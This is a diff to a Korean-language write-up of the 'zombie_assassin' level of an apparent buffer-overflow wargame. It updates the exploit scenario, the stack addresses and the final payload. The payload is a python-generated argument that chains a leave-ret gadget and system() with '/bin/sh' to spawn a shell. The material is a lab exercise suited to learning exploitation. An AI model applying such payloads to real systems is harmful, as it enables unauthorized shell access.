@@ -124,14 +124,12 @@ payload 시나리오 :
 ##### exploit 시나리오 :
 
 ```
-./zombie_assassin `python -c print "&system()"+"\x90"*4+"&["/bin/sh"]"+"\x90"*38+"&[buf-4]"+"&leave-ret 가젯"
+./zombie_assassin `python -c print "\x90"*4+&system()"+"\x90"*4+"&["/bin/sh"]"+"\x90"*24+"&buf"+"&leave-ret 가젯"
 ```
 
-&[buf-4] : 0xbffffaac
+&buf : 0xbffffc60
 
-&[buf+4] : 0xbffffab4
-
-&leave-ret : 0x08048311
+&leave-ret : 0x080484df
 
 &system() : 0x40058ae0
 
@@ -142,7 +140,8 @@ payload 시나리오 :
 ##### Payload
 
 ```
-./zombie_assassin `python -c 'print "\xe0\x8a\x05\x40"+"\x90"*4+"\xf9\xbf\x0f\x40"+"\x90"*28+"\xac\xfa\xff\xbf"+"\x11\x83\x04\x08"'`
+./zombie_assassin `python -c 'print "\x90"*4+"\xe0\x8a\x05\x40"*2+"\xf9\xbf\x0f\x40"+
+"\x90"*(40-16)+"\x60\xfc\xff\xbf"+"\xdf\x84\x04\x08"'`
 ```
 
 -----
